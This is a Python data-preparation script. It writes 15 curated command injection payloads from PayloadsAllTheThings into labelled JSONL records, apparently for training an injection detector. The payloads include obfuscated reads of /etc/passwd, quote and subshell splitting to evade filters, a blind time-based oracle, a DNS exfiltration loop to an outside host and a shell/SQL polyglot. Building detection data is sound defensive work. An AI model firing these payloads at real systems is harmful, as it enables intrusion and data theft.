"""
Hand-curated command injection payloads from PayloadsAllTheThings'
Command Injection page -> training/data_clean/patt_cmdi_curated.jsonl

Source: https://github.com/swisskyrepo/PayloadsAllTheThings
        Command Injection/README.md

Unlike SecLists' command-injection-commix.txt (parse_seclists_cmdi.py),
this page is prose + illustrative markdown with payloads embedded in
fenced code blocks alongside victim-side code snippets and command
output. Automated extraction produced only noise (PHP source, terminal
prompts, unresolved placeholders) - see the investigation this parser
follows. Of ~99 raw lines extracted from code blocks, 21 looked like
genuine standalone payloads after basic filtering; manual review kept
15, each covering a technique not present in the SecLists set:

  - not a real standalone payload (needs victim-side substitution):
    original_cmd_by_server `cat /etc/passwd` and the $() variant -
    "original_cmd_by_server" is a placeholder for code the attacker
    doesn't control, not something to send as-is.
  - duplicate template: `time if [ $(whoami|cut -c 1) == a ]; then
    sleep 5; fi` differs from the kept `== s` version only in the
    comparison character - the same canary-substitution redundancy
    problem found in the SecLists source, applied by hand here.
  - redundant/placeholder wrapper: three context-wrapped copies of the
    same polyglot payload (`echo 1/*...`, `echo "YOURCMD/*..."`,
    `echo 'YOURCMD/*...'`) - one clean copy is kept; two of the three
    also carry an unresolved YOURCMD placeholder.

Each kept payload is tagged with the specific evasion technique it
represents, for traceability of this hand-curation decision.
"""

import json
from pathlib import Path

import yaml

ROOT = Path(__file__).parent.parent.parent
OUTPUT = ROOT / "training" / "data_clean" / "patt_cmdi_curated.jsonl"

with open(ROOT / "training" / "label_map.yaml") as _f:
    _LABEL_MAP = yaml.safe_load(_f)["mappings"]
LABEL = _LABEL_MAP["patt_cmdi_curated"]["cmdi"]

# (payload, technique) - technique is documentation only, not written to
# the output record (CanonicalRequest schema has no field for it).
CURATED_PAYLOADS: list[tuple[str, str]] = [
    (";ls%09-al%09/home",
     "separator + whitespace-filter bypass (tab %09 instead of space)"),
    ("cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
     "tr-based character-shift obfuscation to construct '/' without using it literally"),
    ('cat `echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"`',
     "hex-escape obfuscation via echo -e"),
    ("`echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`",
     "hex-escape obfuscation via ANSI-C quoting ($'...')"),
    ("cat `xxd -r -p <<< 2f6574632f706173737764`",
     "hex-decode obfuscation via xxd + here-string"),
    ("cat `xxd -r -ps <(echo 2f6574632f706173737764)`",
     "hex-decode obfuscation via xxd + process substitution"),
    ("'w'hoami",
     "quote-splitting evasion (single quote)"),
    ('"wh"oami',
     "quote-splitting evasion (double quote)"),
    ("wh``oami",
     "backtick-splitting evasion (empty subshell mid-token)"),
    ("who$()ami",
     "$()-splitting evasion (empty subshell mid-token)"),
    ("who$(echo am)i",
     "$()-reconstruction evasion (subshell produces the missing substring)"),
    ("who`echo am`i",
     "backtick-reconstruction evasion (subshell produces the missing substring)"),
    ("time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi",
     "blind time-based character-oracle extraction"),
    ('for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done',
     "DNS-based data exfiltration"),
    ("/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",
     "polyglot: valid injection syntax across shell comment/subshell/backtick and SQL sleep() contexts simultaneously"),
]


def main() -> None:
    OUTPUT.parent.mkdir(parents=True, exist_ok=True)

    with open(OUTPUT, "w", encoding="utf-8") as fout:
        for payload, _technique in CURATED_PAYLOADS:
            record = {
                "method": "",
                "path": "",
                "query": payload,
                "body": None,
                "userAgent": "",
                "contentType": "",
                "referer": "",
                "cookie": "",
                "extraHeaders": {},
                "label": LABEL,
                "_source": "patt_cmdi_curated",
            }
            fout.write(json.dumps(record, ensure_ascii=False) + "\n")

    print(f"patt_cmdi_curated.jsonl written to {OUTPUT}")
    print(f"  Written: {len(CURATED_PAYLOADS)}")


if __name__ == "__main__":
    main()
